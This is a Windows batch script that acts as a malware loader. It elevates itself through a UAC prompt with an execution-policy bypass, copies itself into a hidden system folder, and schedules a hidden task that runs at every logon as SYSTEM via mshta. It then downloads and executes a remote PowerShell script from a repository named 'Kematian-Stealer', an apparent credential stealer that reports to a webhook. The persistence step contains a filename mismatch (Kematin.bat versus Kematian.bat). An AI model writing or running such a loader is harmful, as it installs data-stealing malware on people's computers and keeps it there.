@echo off
cd /d %~dp0
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
set "pathplz=%appdata%\Kematian"
if not exist %pathplz% md %pathplz% && attrib +s +h %pathplz%
copy %~f0 %pathplz%\Kematin.bat > nul
schtasks /Create /TN "Kematian" /TR "mshta.exe vbscript:createobject('wscript.shell').run('cmd.exe /c %appdata%\Kematian\Kematian.bat',0)(window.close)" /SC ONLOGON /RU SYSTEM /F
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex"
pause
timeout /t 3 /nobreak > nul
exit
